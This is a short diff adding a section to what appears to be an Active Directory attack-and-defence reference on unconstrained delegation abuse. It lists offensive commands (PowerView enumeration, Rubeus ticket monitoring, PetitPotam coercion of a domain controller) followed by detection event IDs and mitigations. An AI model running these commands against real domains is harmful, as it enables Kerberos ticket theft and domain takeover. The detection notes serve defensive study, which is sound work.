@@ -29,3 +29,17 @@ flowchart TD
 
 ### Commands
 ```powershell
+# ── Enumerate unconstrained delegation ──────────────────────────────
+Get-DomainComputer -Unconstrained
+```
+
+```bash
+# ── Coerce DC to the compromised host, then extract tickets ─────────
+Rubeus.exe monitor /interval:5 /nowrap
+python3 PetitPotam.py <unconstrained_host> <dc_ip>
+```
+
+### Detection
+**4768/4769** for a **DC machine account** landing on a member server; PrinterBug/EFSRPC telemetry; remove unconstrained delegation; enable **Protected Users** + **sensitive/cannot-delegate**.
+
+---
